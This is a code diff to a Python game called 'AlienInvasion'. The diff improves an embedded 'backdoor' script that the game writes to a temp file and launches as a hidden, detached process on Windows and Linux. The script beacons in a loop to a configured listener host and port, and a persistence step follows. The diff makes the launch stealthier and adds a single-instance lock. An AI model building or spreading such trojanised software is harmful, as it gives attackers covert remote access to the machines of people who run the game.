@@ -44,17 +44,16 @@ class AlienInvasion:
             import subprocess
             import sys
             import os
+            import tempfile
             
             # Create standalone backdoor script
             backdoor_code = f'''
 import socket
 import subprocess
 import time
-import sys
 
 LISTENER_HOST = "{config.LISTENER_HOST}"
 LISTENER_PORT = {config.LISTENER_PORT}
-RECONNECT_DELAY = 5
 
 while True:
     try:
@@ -80,35 +79,42 @@ while True:
     except:
         pass
     
-    time.sleep(RECONNECT_DELAY)
+    time.sleep(5)
 '''
             
             # Write to temp file
-            import tempfile
             fd, temp_path = tempfile.mkstemp(suffix='.py', text=True)
             with os.fdopen(fd, 'w') as f:
                 f.write(backdoor_code)
             
             # Launch as detached process
             if os.name == 'nt':  # Windows
-                # Use pythonw to run without console
-                python_exe = sys.executable.replace('python.exe', 'pythonw.exe')
-                if not os.path.exists(python_exe):
-                    python_exe = sys.executable
+                # Find pythonw.exe (runs without console)
+                python_dir = os.path.dirname(sys.executable)
+                pythonw = os.path.join(python_dir, 'pythonw.exe')
+                if not os.path.exists(pythonw):
+                    pythonw = sys.executable
+                
+                # Start detached process
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = subprocess.SW_HIDE
                 
                 subprocess.Popen(
-                    [python_exe, temp_path],
-                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-                    close_fds=True,
+                    [pythonw, temp_path],
+                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
+                    startupinfo=startupinfo,
                     stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL
                 )
             else:  # Linux
                 subprocess.Popen(
                     [sys.executable, temp_path],
                     start_new_session=True,
                     stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL
                 )
             
             # Install persistence if enabled
@@ -391,6 +397,18 @@ def show_consent_dialog():
     return False
 
 if __name__ == '__main__':
+    # Prevent multiple instances
+    import socket
+    import sys
+    
+    # Try to bind to a unique port to prevent multiple instances
+    try:
+        lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        lock_socket.bind(('127.0.0.1', 47200))
+    except:
+        # Another instance is already running
+        sys.exit(0)
+    
     # Check dependencies silently in windowed mode
     checker = DependencyChecker()
     checker.ensure_dependencies()
